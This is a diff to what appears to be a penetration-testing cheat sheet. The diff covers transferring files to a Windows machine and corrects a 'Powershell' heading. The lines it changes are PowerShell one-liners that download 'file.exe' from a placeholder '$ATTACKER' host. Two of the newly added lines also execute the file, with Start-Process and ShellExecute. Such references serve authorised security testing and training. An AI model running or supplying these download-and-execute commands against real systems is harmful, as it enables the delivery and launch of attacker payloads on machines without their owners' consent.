@@ -165,10 +165,11 @@ echo bye>>ftp-commands.txt
 ftp -s:ftp-commands.txt
 ```
 
-##### HTTP: Poweshell
+##### HTTP: Powershell
 ```PowerShell
-powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
-powershell.exe -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'}"
+powershell -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
+powershell -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'; Start-Process 'file.exe'}"
+powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');
 ```
 
 ##### HTTP: VBScript
